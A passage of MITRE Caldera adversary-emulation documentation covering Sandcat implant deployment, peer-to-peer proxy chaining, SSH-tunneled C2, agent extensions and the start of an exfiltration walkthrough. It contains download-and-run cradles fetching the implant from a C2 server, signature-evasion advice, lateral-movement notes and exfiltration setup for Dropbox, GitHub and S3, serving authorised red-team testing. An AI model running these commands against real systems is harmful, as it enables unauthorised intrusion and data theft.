including available peer receiver information in the dynamically-compiled binaries. When agents hosting peer proxy
receivers check in through a successful beacon to the C2, the agents will include their peer-to-peer proxy receiver 
addresses and corresponding protocols, if any. The C2 server will store this information to later include
in a dynamically compiled binary upon user request.

Users can compile a Sandcat binary that includes known available peer-to-peer receivers 
(their protocols and locations), by using the `includeProxyPeers` header when sending the HTTP requests
to the Caldera server for agent binary compilation. In order for a receiver to be included, the agent hosting
the receiver must be trusted, and the peer-to-peer protocol for the receiver must be included in the header
value.

The header value can take one of the following formats:
- `All` : include all available receivers
- `protocol1,protocol2,protocol3` : include only the proxy receivers that follow the requested protocols 
(comma-separated). 
- `!protcol1,protocol2,protocol3` : include all available receivers, EXCEPT those that use the indicated protocols.

By specifying protocols, users have greater control over their agents' communication, especially when they 
do not want particular protocols to appear in the local network traffic.

For example, suppose trusted agents A, B, C are each running HTTP proxy receivers at network addresses
`http://10.1.1.11:8081`, `http://10.1.1.12:8082`, `http://10.1.1.13:8083`, respectively. The peer-to-peer proxy protocol
is `HTTP`. When compiling a binary with the HTTP header `includeProxyPeers:All` or `includeProxyPeers:HTTP`, the
binary will contain all 3 URLs for the agent to use in case it cannot connect to the specified C2.

### Required gocat Extensions

To leverage peer-to-peer functionality, one or more gocat extensions may need to be installed. This can be done
through cradles by including the `gocat-extensions` header when sending HTTP requests to the Caldera server for
dynamic Sandcat compilation. The header value will be a comma-separated list of all the desired extensions
(e.g. `proxy_method1,proxy_method2`). If the requested extension is supported and available within the user's current
Caldera installation, then the extension will be included.

### Command Line Options

#### Quickstart

To enable an agent to be used as a proxy:
  1. Include this header in the download command `-H "gocat-extensions:proxy_http"`
  2. Run that agent with the `-listenP2P` flag

To enable an agent to use the other proxy agents you've established:
  1. Include this header in the download command `-H "gocat-extensions:proxy_http"`
  
  Optional: This header can speed up the proxy finding process: `-H "includeProxyPeers:HTTP"`. It tells the server to include a list of known proxy peers in the executable.


#### Starting Receivers

To start an agent with peer-to-peer proxy receivers, the `-listenP2P` commandline switch must be used (no
parameters taken). When this switch is set, the agent will activate all supported peer-to-peer proxy receivers.

Example powershell commands to start an agent with HTTP and SMB Pipe receivers:
```
$url="http://192.168.137.122:8888/file/download";
$wc=New-Object System.Net.WebClient;
$wc.Headers.add("platform","windows");
$wc.Headers.add("file","sandcat.go");
$wc.Headers.add("gocat-extensions","proxy_http,proxy_smb_pipe"); # Include gocat extensions for the proxy protocols.
$output="C:\Users\Public\sandcat.exe";
$wc.DownloadFile($url,$output);
C:\Users\Public\sandcat.exe -server http://192.168.137.122:8888 -v -listenP2P;
```

#### Manually Connecting to Peers via Command-Line

In cases where operators know ahead of time that a newly spawned agent cannot directly connect to the C2, 
they can use the existing command-line options for Sandcat to have the new agent connect to a peer. 
To do so, the `-c2` and `-server` options  are set to the peer-to-peer proxy protocol and address of the 
peer's proxy receiver, respectively.

For example, suppose trusted agent A is running an SMB pipe proxy receiver at pipe path 
`\\WORKSTATION1\pipe\agentpipe`. Instead of compiling a new agent using the HTTP header `includeProxyPeers:All` or 
`includeProxyPeers:SmbPipe` to include the pipe path information in the binary, operators can simply specify
`-c2 SmbPipe` and `-server \\WORKSTATION1\pipe\agentpipe` in the command to run the agent. Note that in this instance,
the appropriate SMB pipe proxy gocat extension will need to be installed when compiling the agent binaries.

Example powershell commands to start an agent and have it directly connect to a peer's SMB pipe proxy receiver:
```
$url="http://192.168.137.122:8888/file/download";
$wc=New-Object System.Net.WebClient;
$wc.Headers.add("platform","windows");
$wc.Headers.add("file","sandcat.go");
$wc.Headers.add("gocat-extensions","proxy_smb_pipe"); # Required extension for SMB Pipe proxy.
$output="C:\Users\Public\sandcat.exe";
$wc.DownloadFile($url,$output);

# ...
# ... transfer SMB Pipe-enabled binary to new machine via lateral movement technique
# ...

# Run new agent
C:\Users\Public\sandcat.exe -server \\WORKSTATION1\pipe\agentpipe -c2 SmbPipe;
```

### Chaining Peer-to-Peer

In complex circumstances, operators can create proxy chains of agents, where communication with the C2 traverses
several hops through agent peer-to-peer links. The peer-to-peer proxy links do not need to all use the same
proxy protocol. If an agent is running a peer-to-peer proxy receiver via the `-listenP2P` command-line flag,
and if the agent uses peer-to-peer communications to reach the C2 (either automatically or manually), then
the chaining will occur automatically without additional user interaction.

Manual example - run peer proxy receivers, but manually connect to another agent's pipe to communicate with the
C2:
```
C:\Users\Public\sandcat.exe -server \\WORKSTATION1\pipe\agentpipe -listenP2P
```

## Peer-To-Peer Interfaces

At the core of the Sandcat peer-to-peer functionality are the peer-to-peer clients and peer-to-peer receivers.
Agents can operate one or both, and can support multiple variants of each.  For instance, an agent that cannot
directly reach the C2 server would run a peer-to-peer client that will reach out to a peer-to-peer receiver running
on a peer agent. Depending on the gocat extensions that each agent supports, an agent could run many different types
of peer-to-peer receivers simultaneously in order to maximize the likelihood of successful proxied peer-to-peer
communication. 

Direct communication between the Sandcat agent and the C2 server is defined by the Contact interface in the contact.go
file within the `contact` gocat package. Because all peer-to-peer communication eventually gets proxied to the C2 
server, agents essentially treat their peer proxy receivers as just another server. 

The peer-to-peer proxy receiver functionality is defined in the `P2pReceiver` interface in the proxy.go file
within the `proxy` gocat package. Each implementation requires the following:
- Method to initialize the receiver
- Method to run the receiver itself as a go routine (provide the forwarding proxy functionality)
- Methods to update the upstream server and communication implementation
- Method to cleanly terminate the receiver.
- Method to get the local receiver addresses.

## Current Peer-to-Peer Implementations

### HTTP proxy

The Sandcat agent currently supports one peer-to-peer proxy: a basic HTTP proxy. Agents that want to use the HTTP
peer-to-peer proxy can connect to the C2 server via an HTTP proxy running on another agent. Agent A can start an
HTTP proxy receiver (essentially a proxy listener) and forward any requests/responses. Because the nature of an
HTTP proxy receiver implies that the running agent will send HTTP requests upstream, an agent must be using the HTTP
c2 protocol in order to successfully provide HTTP proxy receiver services.

The peer-to-peer HTTP client is the same HTTP implementation of the Contact interface, meaning that an agent simply
needs to use the `HTTP` c2 protocol in order to connect to an HTTP proxy receiver.

In order to run an HTTP proxy receiver, the Sandcat agent must have the `proxy_http` gocat extension installed.

#### Example commands:

Compiling and running a Sandcat agent that supports HTTP receivers:
```
$url="http://192.168.137.122:8888/file/download";
$wc=New-Object System.Net.WebClient;$wc.Headers.add("platform","windows"); 
$wc.Headers.add("file","sandcat.go");
$wc.Headers.add("gocat-extensions","proxy_http");
$output="C:\Users\Public\sandcat.exe";$wc.DownloadFile($url,$output);
C:\Users\Public\sandcat.exe -server http://192.168.137.122:8888 -v -listenP2P
```

# C2 Communications Tunneling
In addition to built-in contact methods such as HTTP, DNS, TCP, and UDP, Caldera also provides support for tunneling C2 traffic, which supporting agents can use to mask built-in contact methods for added defense evasion.
Currently, the only available tunneling method is SSH tunneling, which is only supported by the sandcat agent.

## SSH Tunneling
Sandcat agents can use SSH tunneling to tunnel C2 contact mechanisms, namely HTTP(S). Caldera also provides built-in support to spin up a minimal local SSH server for SSH tunneling.

### Usage - Serverside
Within the Caldera configuration file, adjust the following entries according to your environment:
- `app.contact.tunnel.ssh.host_key_file`: File name for the server's SSH private host key. You can generate your own SSH private host key for the Caldera server. The file must reside in the `conf/ssh_keys` directory. If the Caldera server cannot find or read the provided private host key, it will generate a temporary RSA host key to use for operations. Although this would cause security warnings under normal circumstances, the sandcat agent implementation of SSH tunneling does not attempt to verify hosts, and thus should not be affected by changing or temporary host keys.
- `app.contact.tunnel.ssh.host_key_passphrase`: Passphrase for the server's SSH private host key. The server will use this passphrase to read the private host key file provided in `app.contact.tunnel.ssh.host_key_file`.
- `app.contact.tunnel.ssh.socket`: Indicates the IP address and port that the Caldera server will listen on for SSH tunneling connections (e.g. `0.0.0.0:8022`).
- `app.contact.tunnel.ssh.user_name`: User name that agents will use to authenticate to the Caldera server via SSH. The default value is `sandcat`.
- `app.contact.tunnel.ssh.user_password`: Password that agents will use to authenticate to the Caldera server via SSH. The default value is `s4ndc4t!`.

Once the configuration entries are set, simply start the Caldera server up as normal via the `server.py` Python program, and Caldera will automatically attempt to start an SSH server that listens on the specified socket (`app.contact.tunnel.ssh.socket`). 

The contact will first attempt to read in the host private key file specified by `app.contact.tunnel.ssh.host_key_file`, using the passphrase specified by `app.contact.tunnel.ssh.host_key_passphrase`. If it cannot read the file for whatever reason (e.g. file does not exist, or the passphrase is incorrect), then the server will generate its own temporary private key to use for the server. 

The SSH server should only be used between agents and the C2 server and should not be used to SSH into the Caldera server manually (e.g. to manage the server remotely).

### Usage - Agent
The sandcat agent is currently the only agent that supports SSH tunneling. To use it, the `server`, `tunnelProtocol`, `tunnelAddr`, `tunnelUser`, and `tunnelPassword` arguments must be used. 
- `server` value is the Caldera server endpoint that the tunnel will connect to - if the agent is tunneling HTTP communications through SSH, then `server` should be the HTTP socket for the Caldera C2 server (e.g. `http://10.10.10.15:8888`). 
- `tunnelProtocol` value is the name of the tunneling mechanism that the agent is using. For SSH, the value must be `SSH`. 
- `tunnelAddr` is the port number or IP:port combination that indicates which port or socket to connect to via SSH to start the tunnel (e.g. `8022` or `10.10.10.15:8022`). If only a port number is provided, the agent will try to connect to the IP address from `server` using the specified port. The server listening on the port/socket should be listening for SSH connections from agents.
- `tunnelUser` indicates which username to use to authenticate to `tunnelAddr` via SSH. This username should match the Caldera configuration value for `app.contact.tunnel.ssh.user_name`.
- `tunnelPassword` indicates which password to use to authenticate to
`tunnelAddr` via SSH. This password should match the Caldera configuration value for `app.contact.tunnel.ssh.user_password`.

To tunnel different contacts through SSH tunneling, simply adjust the `c2` and `server` values as needed.

When authenticating to the provided SSH server, the sandcat agent will use the username/password provided by the `tunnelUser` and `tunnelPassword` arguments. Whatever credentials the agent uses must reflect the Caldera configuration values specified in `app.contact.tunnel.ssh.user_name` and `app.contact.tunnel.ssh.user_password`. The agent will then open a random local port to act as the local endpoint of the SSH tunnel. This local endpoint becomes the `upstream_dest` value for the agent.

The following commandline will start a sandcat agent that will open up an SSH tunnel to the Caldera c2 server at `192.168.140.1:8022`, and the tunneled communications will be sent to the c2 server's HTTP endpoint at `192.168.140.1:8888`:
```sh
server="http://192.168.140.1:8888";
curl -s -X POST -H "file:sandcat.go" -H "platform:linux" $server/file/download > sandcat.go;
chmod +x sandcat.go;
./sandcat.go -server $server -v -tunnelProtocol SSH -tunnelAddr 8022 -tunnelUser sandcat -tunnelPassword s4ndc4t!
```

The above Linux agent will produce verbose output similar to the following:
```
SStarting sandcat in verbose mode.
[*] Starting SSH tunnel
Starting local tunnel endpoint at localhost:52649
Setting server tunnel endpoint at 192.168.140.1:8022
Setting remote endpoint at localhost:8888
[*] Listening on local SSH tunnel endpoint
[*] SSH tunnel ready and listening on http://localhost:52649.
[*] Attempting to set channel HTTP
Beacon API=/beacon
[*] Set communication channel to HTTP
initial delay=0
server=http://192.168.140.1:8888
upstream dest addr=http://localhost:52649
group=red
privilege=User
allow local p2p receivers=false
beacon channel=HTTP
Local tunnel endpoint=http://localhost:52649
[*] Accepted connection on local SSH tunnel endpoint
[*] Listening on local SSH tunnel endpoint
[*] Forwarding connection to server
[*] Opened remote connection through tunnel
[+] Beacon (HTTP): ALIVE
```

The agent connected to the C2 server via SSH at `192.168.140.1:8022` and opened a local SSH tunnel on local port 52649 that tunnels HTTP traffic to the C2 server at `192.168.140.1:8888`. This is the equivalent of running `ssh -L 52649:localhost:8888 sandcat@192.168.140.1 -p 8022 -N`.

Note that the agent's upstream destination endpoint is set to the local SSH tunnel endpoint at `http://localhost:54351` (the protocol is set to `http` since the agent is tunneling HTTP comms), while the true server value is the final tunnel destination at `http://192.168.140.1:8888`.

If running the Caldera c2 server with logging verbosity set to `DEBUG`, you may see output similar to the following when an agent connects via SSH tunneling:
```
2021-03-26 09:12:43 - INFO  (logging.py:79 log) [conn=2] Accepted SSH connection on 192.168.140.1, port 8022
2021-03-26 09:12:43 - INFO  (logging.py:79 log) [conn=2]   Client address: 192.168.140.100, port 43796
2021-03-26 09:12:43 - DEBUG (contact_ssh.py:52 connection_made) SSH connection received from 192.168.140.100.
2021-03-26 09:12:43 - DEBUG (logging.py:79 log) [conn=2] Requesting key exchange
2021-03-26 09:12:43 - DEBUG (logging.py:79 log) [conn=2] Received key exchange request
2021-03-26 09:12:43 - DEBUG (logging.py:79 log) [conn=2] Beginning key exchange
2021-03-26 09:12:43 - DEBUG (logging.py:79 log) [conn=2] Completed key exchange
2021-03-26 09:12:43 - INFO  (logging.py:79 log) [conn=2] Beginning auth for user sandcat
2021-03-26 09:12:43 - DEBUG (logging.py:79 log) [conn=2] Trying password auth
2021-03-26 09:12:43 - INFO  (logging.py:79 log) [conn=2] Auth for user sandcat succeeded
2021-03-26 09:12:43 - DEBUG (contact_ssh.py:48 connection_requested) Connection request from 0.0.0.0:0d to localhost:8888
2021-03-26 09:12:43 - DEBUG (logging.py:79 log) [conn=2, chan=0] Set write buffer limits: low-water=16384, high-water=65536
2021-03-26 09:12:43 - INFO  (logging.py:79 log) [conn=2] Accepted direct TCP connection request to localhost, port 8888
2021-03-26 09:12:43 - INFO  (logging.py:79 log) [conn=2]   Client address: 0.0.0.0
2021-03-26 09:12:43 - INFO  (logging.py:79 log) [conn=2]   Forwarding TCP connection to localhost, port 8888
2021-03-26 09:12:43 - DEBUG (contact_svc.py:64 handle_heartbeat) First time HTTP beacon from kliuok
```

Once the tunnel is established, operators can proceed as normal with agent activity and operations.

# Uninstall MITRE Caldera

To uninstall Caldera, navigate to the directory where Caldera was installed and recursively remove the directory using the following command: 
```
rm -rf caldera/
```

Caldera may leave behind artifacts from deployment of agents and operations. Remove any remaining Caldera agents, files, directories, or other artifacts left on your server and remote systems:
```
rm [ARTIFACT_NAME]
```

Generated reports and exfiled files are saved in `/tmp` on the server where Caldera is installed.

Some examples of Caldera artifacts left by agents (on server if agent ran locally, on clients if run remotely):
* **_sandcat.go_**: sandcat agent
* **_manx.go_**: manx agent 
* **_nohup.out_**: ouput file from deployment of certain sandcat and manx agents

# Troubleshooting

## Installing MITRE Caldera

If `donut-shellcode` installation fails, ensure that prerequisite packages are installed
  - Amazon Linux 2:
    - `gcc`
    - `python3-devel`

## Starting Caldera

1. Ensure that Caldera has been cloned recursively. Plugins are stored in submodules and must be cloned along with the core code.
1. Check that Python 3.8+ is installed and being used. 
1. Confirm that all `pip` requirements have been fulfilled.
1. Run the Caldera server with the `--log DEBUG` parameter to see if there is additional output.
1. Consider removing the `conf/local.yml` and letting Caldera recreate the file when the server runs again.

### Module Not Found Error

If you get an error like `ModuleNotFoundError: No module named 'plugins.manx.app'` when starting Caldera:
1. Check to see if the `plugins/manx` folder is empty
   1. Ensure that Caldera has been cloned recursively. Plugins are stored in submodules and must be cloned along with the core code.
   1. Alternatively, from the plugins folder, you can run `git clone https://github.com/mitre/manx.git` to grab only the manx repo.
1. Check your `conf/local.yml` to make sure manx is enabled


## Stopping Caldera

Caldera has a backup, cleanup, and save procedure that runs when the key combination `CTRL+C` is pressed. This is the recommended method to ensure proper shutdown of the server. If the Python process executing Caldera is halted abruptly (for example SIGKILL) it can cause information from plugins to get lost or configuration settings to not reflect on a server restart.

## Agent Deployment

### Downloading the agent

1. Check the server logs for the incoming connection. If there is no connection:
   1. Check for any output from the agent download command which could give additional information.
   1. Make sure the agent is attempting to connect to the correct address (not `0.0.0.0` and likely not `127.0.0.1`).
   1. Check that the listen interface is the same interface the agent is attempting to connect to.
   1. Check that the firewall is open, allowing network connections, between the remote computer running the agent and the server itself.
1. Ensure Go is properly installed (required to dynamically-compile Sandcat):
   1. Make sure the Go environment variables are properly set. Ensure the PATH variable includes the Go binaries by adding this to the `/etc/profile` or similar file: 
      ```
      export PATH=$PATH:/usr/local/go/bin
      ```
   2. If there are issues with a specific package, run something like the following:
      ```
      go get -u github.com/google/go-github/github
      go get -u golang.org/x/oauth2
      ```

### Running the agent

1. Run the agent with the `-v` flag and without the `-WindowStyle hidden` parameter to view output.
1. Consider removing bootstrap abilities so the console isn't cleared.

## Operations

### No operation output

1. Ensure that at least one agent is running before running the operation.
   1. Check that the agent is running either on the server or in the agent-specific settings under last checked in time.
   1. Alternatively, clear out the running agent list using the red X's. Wait for active agents to check in and repopulate the table.
1. Ensure that an adversary is selected before running the operation.
1. Check each ability on the adversary profile.
   1. Abilities show an icon for which operating system they run on. Match this up with the operating systems of the running agents.
   1. Abilities have specific executors in the details. Match this up with the executors of the running agents (found under the agent-specific settings).
   1. Look at each ability command. If there is a fact variable inside - shown by #{} syntax - the ability will need to be "unlocked" by another ability, in a prior step, before it can run. 

## Opening Files

1. Files are encrypted by default and can be decrypted with the following utility: <https://github.com/mitre/caldera/blob/master/app/utility/file_decryptor.py> 

Resources
---------

Summary Sheets
==============

- :download:`Caldera Summary Sheet <./_static/Caldera_Summary.pdf>`
- :download:`Use Cases Sheet <./_static/Caldera_Use_Cases.pdf>`
- :download:`Instructor Guide Sheet <./_static/Caldera_Instructor_Guide.pdf>`

Ability List
============

The following file contains a list of Caldera's abilities in comma-separated value (CSV) format.

:download:`abilities.csv <_generated/abilities.csv>`


Lateral Movement Video Tutorial
===============================

Download from here: :download:`lm_guide.mp4 <./_static/lm_guide.mp4>`

.. raw:: html

    <video width="700" height="450" controls>
      <source src="./_static/lm_guide.mp4" type="video/mp4">
    Your browser does not support the video tag.
    </video>


    # Sandcat Plugin Details

The Sandcat plugin provides Caldera with its default agent implant, Sandcat.
The agent is written in GoLang for cross-platform compatibility and can currently be compiled to run on
Windows, Linux, and MacOS targets.

While the Caldera C2 server requires GoLang to be installed in order to compile agent binaries, 
no installation is required on target machines - the agent program will simply run as an executable.

The `sandcat` plugin does come with precompiled binaries, but these only contain the basic
agent features and are more likely to be flagged by AV as they are publicly available on GitHub.

If you wish to dynamically compile agents to produce new hashes or include additional agent features,
the C2 server must have GoLang installed.

## Source Code
The source code for the sandcat agent is located in the `gocat` and `gocat-extensions` directories.
`gocat` contains the core agent code, which provides all of the basic features.
`gocat-extensions` contains source code for extensions that can be compiled into new agent binaries on demand.
The extensions are kept separate to keep the agent lightweight and to allow more flexibility when catering to
various use cases.

## Precompiled Binaries
Precompiled agent binaries are located in the `payloads` directory and are referenced with the following filename:
- `sandcat.go-darwin` compiled binary for Mac targets
- `sandcat.go-darwin-arm64` compiled binary for Mac with ARM processor targets
- `sandcat.go-linux` compiled binary for Linux targets
- `sandcat.go-windows` compiled binary for Windows targets

These files get updated when dynamically compiling agents, so they will always contain the
latest compiled version on your system.

## Deploy

To deploy Sandcat, use one of the built-in delivery commands from the main server GUI which allows you to run the agent 
on Windows, Mac, or Linux.

Each of these commands downloads a compiled Sandcat executable from Caldera and runs it immediately.

Once the agent is running, it should show log messages when it beacons into Caldera.

> If you have GoLang installed on the Caldera server, each time you run one of the delivery commands above, 
the agent will re-compile itself dynamically to obtain a new file hash. This will help bypass file-based signature detections.

### Options

When running the Sandcat agent binary, there are optional parameters you can use when you start the executable:

* `-H "architecture: [architecture]"`: For MacOS, both amd64 and arm64 are supported. When retrieving the executable from the server, the architecture header can be used to select the correct executable: `-H "architecture:amd64"` or `-H "architecture:arm64"`.
* `-server [C2 endpoint]`: This is the location (e.g. HTTP URL, IPv4:port string) that the agent will use to reach the C2 server. (e.g. `-server http://10.0.0.1:8888`, `-server 10.0.0.1:53`, `-server https://example.com`). The agent must have connectivity to this endpoint. 
* `-group [group name]`: This is the group name that you would like the agent to join when it starts. The group does not have to exist beforehand. A default group of `red` will be used if this option is not provided (e.g. `-group red`, `-group mygroup`)
* `-v`: Toggle verbose output from sandcat. If this flag is not set, sandcat will run silently. This only applies to output that would be displayed on the target machine, for instance if running sandcat from a terminal window. This option does not affect the information that gets sent to the C2 server.
* `-httpProxyGateway [gateway]`: Sets the HTTP proxy gateway if running Sandcat in environments that use proxies to reach the internet
* `-paw [identifier]`: Optionally assign the agent with an identifier value. By default, the agent will be assigned a random identifier by the C2 server.
* `-c2 [C2 method name]`: Instruct the agent to connect to the C2 server using the given C2 communication method. By default, the agent will use HTTP(S). The following C2 channels are currently supported:
    - HTTP(S) (`-c2 HTTP`, or simply exclude the `c2` option)
    - DNS Tunneling (`-c2 DnsTunneling`): requires the agent to be compiled with the DNS tunneling extension.
    - FTP (`-c2 FTP`): requires the agent to be compiled with the FTP extension
    - Github GIST (`-c2 GIST`): requires the agent to be compiled with the Github Gist extension
    - Slack (`-c2 Slack`): requires the agent to be compiled with the Slack extension
    - SMB Pipes (`-c2 SmbPipe`): allows the agent to connect to another agent peer via SMB pipes to route traffic through an agent proxy to the C2 server. Cannot be used to connect directly to the C2. Requires the agent to be compiled with the `proxy_smb_pipe` SMB pipe extension.
* `-delay [number of seconds]`: pause the agent for the specified number of seconds before running
* `-listenP2P`: Toggle peer-to-peer listening mode. When enabled, the agent will listen for and accept peer-to-peer connections from other agents. This feature can be leveraged in environments where users want agents within an internal network to proxy through another agent in order to connect to the C2 server.
* `-originLinkID [link ID]`: associated the agent with the operation instruction with the given link ID. This allows the C2 server to map out lateral movement by determining which operation instructions spawned which agents.

Additionally, the sandcat agent can tunnel its communications to the C2 using the following options (for more details, see the [C2 tunneling documentation](../../C2-Tunneling.md)

## Extensions
In order to keep the agent code lightweight, the default Sandcat agent binary ships with limited basic functionality.
Users can dynamically compile additional features, referred to as "gocat extensions".
Each extension is temporarily added to the existing core sandcat code to provide functionality such as peer-to-peer proxy implementations, additional
executors, and additional C2 communication protocols. 

To request particular extensions, users must include the `gocat-extensions` HTTP header when asking the C2 to compile an agent. 
The header value must be a comma-separated list of requested extensions.
The server will include the extensions in the binary if they exist and if their dependencies are met (i.e. if the extension requires a particular
GoLang module that is not installed on the server, then the extension will not be included).

Below is an example PowerShell snippet to request the C2 server to include the `proxy_http` and `shells` 
extensions:
```
$url="http://192.168.137.1:8888/file/download"; # change server IP/port as needed
$wc=New-Object System.Net.WebClient;
$wc.Headers.add("platform","windows"); # specifying Windows build
$wc.Headers.add("file","sandcat.go"); # requesting sandcat binary
$wc.Headers.add("gocat-extensions","proxy_http,shells"); # requesting the extensions
$output="C:\Users\Public\sandcat.exe"; # specify destination filename
$wc.DownloadFile($url,$output); # download
```

The following features are included in the stock default agent:
- `HTTP` C2 contact protocol for HTTP(S)
- `psh` PowerShell executor (Windows)
- `cmd` cmd.exe executor (Windows)
- `sh` shell executor (Linux/Mac)
- `proc` executor to directly spawn processes from executables without needing to invoke a shell (Windows/Linux/Mac)
- SSH tunneling to tunnel traffic to the C2 server.

Additional functionality can be found in the following agent extensions:

**C2 Communication Extensions**
- `gist`: provides the Github Gist C2 contact protocol. Requires the following GoLang modules:
    - `github.com/google/go-github/github`
    - `golang.org/x/oauth2`
- `dns_tunneling`: provides the DNS tunneling C2 communication protocol. Requires the following GoLang modules:
    - `github.com/miekg/dns`
- `ftp`: provides the FTP C2 communication protocol. Requires the following GoLang modules:
    - `github.com/jlaffaye/ftp`
- `slack`: provides the Slack C2 communication protocol.
- `proxy_http`: allows the agent to accept peer-to-peer messages via HTTP. Not required if the agent is simply using HTTP to connect to a peer (acts the same as connecting direclty to the C2 server over HTTP).
- `proxy_smb_pipe`: provides the `SmbPipe` peer-to-peer proxy client and receiver for Windows (peer-to-peer communication via SMB named pipes).
    - Requires the `gopkg.in/natefinch/npipe.v2` GoLang module

**Executor Extensions**
- `shells`: provides the `osascript` (Mac Osascript), `pwsh` (Windows powershell core), and Python (`python2` and `python3`) executors.
- `shellcode`: provides the shellcode executors.
- `native`: provides basic native execution functionality, which leverages GoLang code to perform tasks rather than calling external binaries or commands.
- `native_aws`: provides native execution functionality specific to AWS. Does not require the `native` extension, but does require the following GoLang modules:
    - `github.com/aws/aws-sdk-go`
    - `github.com/aws/aws-sdk-go/aws`
- `donut`: provides the Donut functionality to execute certain .NET executables in memory. See https://github.com/TheWover/donut for additional information.

**Other Extensions**
- `shared` extension provides the C sharing functionality for Sandcat. This can be used to compile Sandcat as a DLL rather than a `.exe` for Windows targets.

## Exit Codes

Exit codes returned from Sandcat vary across executors. Typical shell executors will return the exit code provided by the shell. Certain executor extensions will return values hard-coded in Sandcat.

Sandcat includes general exit codes which may be utilized by executors, overriden by executors, or used in error cases. The following values describe general Sandcat exit codes:
- `-1`: Error (e.g., cannot decode command, payload not available)
- `0`: Success

The following values describe exit codes utilized by specific executors:
- `shells`: Returns the exit code provided by the OS/shell.
- `shellcode`: Utilizes the general Sandcat exit codes.
- `native` and `native_aws`:
    - `0`: Success
    - `1`: Process error (e.g., error while executing code)
    - `2`: Input error (e.g., invalid parameters)
- `donut`: Returns the exit code provided by the OS/shell.

## Customizing Default Options & Execution Without CLI Options

It is possible to customize the default values of these options when pulling Sandcat from the Caldera server.  
This is useful if you want to hide the parameters from the process tree or if you cannot specify arguments when executing the agent binary. 

You can do this by passing the values in as headers when requesting the agent binary from the C2 server instead of as parameters when executing the binary.

The following parameters can be specified this way:
- `server`
- `group`
- `listenP2P`

For example, the following will download a linux executable that will use `http://10.0.0.2:8888` as the server address
instead of `http://localhost:8888`, will set the group name to `mygroup` instead of the default `red`, and will enable the P2P listener:

```
curl -sk -X POST -H 'file:sandcat.go' -H 'platform:linux' -H 'server:http://10.0.0.2:8888' -H 'group:mygroup' -H 'listenP2P:true' http://localhost:8888/file/download > sandcat
```

Additionally, if you want the C2 server to compile the agent with a built-in list of known peers (agents that are actively listening for peer-to-peer requests), you can do so with the following header:
- `includeProxyPeers` 
Example usage:
- `includeProxyPeers:all` - include all peers, regardless of what proxy methods they are listening on
- `includeProxypeers:SmbPipe` - only include peers listening for SMB pipe proxy traffic
- `includeProxypeers:HTTP` - only include peers listening for HTTP proxy traffic.


# Stockpile: Exfiltration Walkthrough

This document will discuss how to utilize various exfiltration abilities within Caldera, specifically focused on the
following abilities:

- Advanced File Search and Stager
- Find Git Repositories & Compress Git Repository (local host)
- Compress Staged Directory (Password Protected) – 7z and tar+gpg
- Compress Staged Directory (Password Protected) and Break Into Smaller Files
- Exfil Compressed Archive to FTP
- Exfil Compressed Archive to Dropbox
- Exfil Compressed Archive to GitHub Repositories | Gists
  - Additionally: Exfil Directory Files to Github
- Exfil Compressed Archive to S3 via AWS CLI
- Transfer Compressed Archive to Separate S3 Bucket via AWS CLI
- Scheduled Exfiltration (uses the standard HTTP C2 channel)

Note: the exfiltration abilities (to GitHub, Dropbox, FTP, and AWS) require a compressed archive with a corresponding
`host.dir.compress` fact unless otherwise noted.

If you want to skip straight to an example, [click here](#operation)

## Groundwork - Destinations
To fully capitalize on the exfiltration abilities, you will need to do a little set up on the far end to 
receive the exfiltrated data.

### Dropbox
If you do not have a Dropbox account already, you can obtain a free account (with storage size limitations) by navigating
to the [signup page for a basic account](https://dropbox.com/basic) and fill in the required information.

Once you have an activated account, you will navigate to the App Center and select 'Manage'. In the left-hand toolbar and
near the bottom, select 'Build an App'. The name will need to be unique; fill out the requested information. Generate
an access token and set it for the desired expiration time (default as of this document is 4 hours). You may need to
update your access token periodically prior to operations.

On the permissions tab, grant the application read and write access for files and folders, then submit the application.

Uploaded files should appear under Apps/AppName/FolderName if you elected to segregate app folders.

### GitHub Repositories
Chances are you already have a [GitHub account](https://github.com) if you're using this platform. 
Create a new repository per the standard instructions. If you do not already have a private access token, you can create
it under Settings > Developer Settings > Personal Access Tokens. Select if you want the token to also apply to Gists 
while you're here.

You can commit directly to main if desired, or you can use a branch for your operations (just be sure to update the fact
source with the desired branch, discussed below). Keep track of your GitHub username, access token, and branch name for 
the fact source.

### GitHub Gist
This is a much simpler case - simply have a GitHub account and obtain an access token as described above (Settings >
Developer Settings > Personal Access Tokens). Ensure the access token also applies to Gists if you already have one.

Keep track of the access token and your username for the fact source.

### FTP
There are a number of ways to start an FTP server depending on your OS; start the service per your operating system's 
requirements. As a note, FTP services may not like writable chroots if configured. To avoid this, either allow writeable
chroots or designate a specific folder for Caldera uploads and supply that in the fact source.

For example, with vsftpd you can either:

- Edit `/etc/vsftpd.conf` to include `allow_writable_chroot=YES`
- Supply a writable folder in addition to the FTP server address in the Caldera fact source. E.g. `value: 192.168.1.2/upload`

### AWS
The exfiltration via AWS CLI abilities assume the AWS CLI is installed on the host machine. For use with an IAM user,
the proper credentials (access key, secret access key, and also session token if using MFA) must be provided for the
`[default]` profile in `~/.aws/credentials`. The `[default]` profile may require some additional setup with the correct
region and output within `~/.aws/config`.

For exfiltration to S3 bucket, the permissions must be in place to allow the `[default]` profile read/write accesses
to the target S3 bucket (examples: `s3:ListBucket`, `s3:PutObject`).

For transferring data to a separate S3 bucket, proper policies must be configured in the source AWS account to allow
listing (`s3:ListBucket`) and getting (`s3:PutObject`) objects from the source S3 bucket in addition to listing,
putting objects, and setting the ACL when putting (`s3:PutObjectAcl`) an object to the destination S3 bucket. Policies
must also be configured in the destination AWS account to allow the source AWS account to put objects and set the
object's ACL in the destination S3 bucket. This will ensure that objects transferred to the destination account will
automatically become owned by the destination bucket owner, who will then have full control of the transferred objects.

## The Fact Source
Caldera uses **facts** in its operations to collect and act upon information of import. For more general information, 
see the [docs](https://caldera.readthedocs.io/en/latest/Basic-Usage.html#facts). To aid in exfiltration testing, Stockpile
contains a fact source for basic testing with the various facts consumed by the abilities listed above (data/sources/2ccb822c-088a-4664-8976-91be8879bc1d).
Note that this **does not** include all facts used by other exfiltration abilities in Caldera, such as those offered by
the Atomic plugin.

Most of the fact source is commented-out by default excepting the search and stage ability. To plan an operation,
first consider the various file searching and staging options available. The source file contains information on the 
options available to you as the user along with the required formatting and default values as examples.

Review the remaining facts and un-comment (remove the `#` at the start of the line) the applicable facts -- both the trait
and value lines. For sections like GitHub, notes have been left regarding which facts are required for either exfil to
repositories or Gists. For example, only the first two facts below need to be un-commented and updated if using Gists:
```
  # GitHub Exfiltration
  # -------------------------------------
  #- trait: github.user.name        <--- Uncomment
  #  value: CHANGEME-BOTH           <--- Uncomment & Update
  #- trait: github.access.token     <--- Uncomment
